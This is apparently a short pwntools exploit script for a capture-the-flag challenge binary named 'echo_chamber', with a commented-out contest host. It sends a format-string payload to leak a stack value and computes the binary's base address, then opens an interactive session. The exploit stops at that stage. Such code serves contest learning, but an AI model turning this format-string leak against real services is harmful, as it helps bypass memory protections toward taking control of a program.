#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./echo_chamber")
        self.libc = ELF("./libc.so.6")

    def start_binary(self):
        self.p = process("./echo_chamber", env={
            "LD_PRELOAD": "libc.so.6",
        })
#        self.p = remote("echochamber.uni.hctf.fun", 13374)
        self.p.recvuntil("chamber!\n")

    def leak_addr(self, offset):
        self.p.sendline("%"+str(offset)+"$x")
        data=self.p.recv()
        return int(data, 16)

    def pwn_binary(self):
        self.start_binary()

        bin_base=self.leak_addr(5)-0x2029
        print "[x] Leak binary base address: "+hex(bin_base)

        self.p.interactive()
        self.p.close()

def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
